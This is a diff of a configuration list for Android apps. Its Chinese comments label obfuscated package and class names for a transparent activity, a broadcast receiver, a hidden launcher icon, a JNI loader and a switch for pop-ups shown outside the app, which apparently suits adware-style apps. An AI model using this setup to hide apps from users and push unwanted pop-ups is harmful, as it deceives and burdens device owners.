@@ -1,11 +1,10 @@
 
-['com.jgaodl.drinks.waters.days.happys.xy', 'com.recorddrink.bup',  # 包名
-               'com.snow.fall.willows.swaying.febfive.SoCanActivity',# 透明activity
-               'com.snow.fall.willows.swaying.febfive.pz.so.FebFiveAaaService', # JobSchedulerService
-               'com/snow/fall/willows/swaying/febfive/pz/rock/FebFiveMmmRecent',  #  广播
+ffzo['com.jgaodl.drinks.waters.days.happys.xy', 'com.batafast.drinkhighteasy',  # 包名
+               'com.jgaodl.drinks.waters.days.happys.xy.aac.FfzTw',# 透明activity
+               'com/jgaodl/drinks/waters/days/happys/xy/ar/FfzAcQd',  #  广播
                '', 'com.jgaodl.drinks.waters.days.happys.xy.MainActivity',  # 隐藏图标 other1","main2
-               'com/snow/fall/willows/swaying/febfive/start/FebFive', '"febSo"',# jni路径及函数
-              '/febfan']  # 外弹文件开关名
+               'com/jgaodl/drinks/waters/days/happys/xy/al/load/FfzMain', '"ffzTools"',# jni路径及函数
+              '/ffzofl']  # 外弹文件开关名
 
 
 
